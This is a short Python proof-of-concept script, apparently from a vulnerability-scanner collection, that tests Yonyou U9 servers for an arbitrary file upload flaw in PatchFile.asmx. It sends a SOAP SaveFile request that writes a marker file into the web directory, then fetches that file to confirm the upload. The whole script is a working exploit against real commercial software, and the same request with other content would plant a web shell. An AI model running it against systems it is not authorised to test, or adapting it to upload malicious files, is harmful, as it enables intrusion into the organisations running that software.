import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友-U9-PatchFile.asmx任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36',
        'Connection': 'close',
        'Content-Type': 'text/xml; charset=utf-8',
        'Content-Length': '421'
    }
    data = '''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <SaveFile xmlns="http://tempuri.org/">
          <binData>dGVzdDEyMw==</binData>
          <path>./</path>
          <fileName>69123.txt</fileName>
        </SaveFile>
      </soap:Body>
    </soap:Envelope>'''
    vurl = urllib.parse.urljoin(url, "/CS/Office/AutoUpdates/PatchFile.asmx")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200:
            response = requests.get(url+'/CS/Office/AutoUpdates/69123.txt')
            if response.status_code == 200 and 'test123' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = url+'/CS/Office/AutoUpdates/69123.txt'
        return relsult

    except:
        return relsult